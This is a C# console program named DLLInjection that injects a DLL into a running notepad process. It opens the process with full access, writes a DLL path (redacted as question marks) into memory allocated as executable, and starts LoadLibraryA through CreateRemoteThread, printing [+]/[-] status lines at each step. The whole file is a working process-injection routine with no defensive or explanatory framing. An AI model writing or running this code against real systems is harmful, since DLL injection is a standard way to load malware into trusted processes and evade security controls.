using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace DLLInjection
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            uint processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        const uint PROCESS_ALL_ACCESS = (uint)(0x000F0000L | 0x00100000L | 0xFFFF);
        const uint MEM_COMMIT = 0x00001000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            Process[] procArr = Process.GetProcessesByName("notepad");
            if (procArr.Length == 0) 
            {
                Console.WriteLine("[-] Process.GetProcessesByName");
                return;
            }
                
            int procId = procArr[0].Id;
            Console.WriteLine("[+] Process.GetProcessesByName: " + procId);

            IntPtr procHandle = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)procId);
            if (procHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] OpenProcess");
                return;
            }
            Console.WriteLine("[+] OpenProcess");

            string dllPath = "C:\\???\\???\\???.dll";
            byte[] dllBytes;
            try
            {
                dllBytes = Encoding.Default.GetBytes(dllPath);
                if (dllBytes.Length == 0)
                {
                    Console.WriteLine("[-] Encoding.Default.GetBytes: Empty");
                    return;
                }
                Console.WriteLine("[+] Encoding.Default.GetBytes: " + dllBytes.Length);
            }

            catch
            {
                Console.WriteLine("[-] Encoding.Default.GetBytes: Not Found");
                return;
            }

            IntPtr allocAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint) dllBytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (allocAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAllocEx");
                return;
            }
            Console.WriteLine("[+] VirtualAllocEx");

            IntPtr outSize;
            bool res = WriteProcessMemory(procHandle, allocAddr, dllBytes, dllPath.Length, out outSize);
            if (!res)
            {
                Console.WriteLine("[-] WriteProcessMemory");
                return;
            }
            Console.WriteLine("[+] WriteProcessMemory");

            IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
            if (kernel32Handle == IntPtr.Zero)
            {
                Console.WriteLine("[-] GetModuleHandle");
                return;
            }
            Console.WriteLine("[+] GetModuleHandle");

            IntPtr loadLibProcAddr = GetProcAddress(kernel32Handle, "LoadLibraryA");
            if (loadLibProcAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] GetProcAddress");
                return;
            }
            Console.WriteLine("[+] GetProcAddress");

            IntPtr threadId;
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibProcAddr, allocAddr, 0, out threadId);
            if(threadId == IntPtr.Zero)
            {
                Console.WriteLine("[-] CreateRemoteThread");
                return;
            }
            Console.WriteLine("[+] CreateRemoteThread: " + threadId);
        }
    }
}
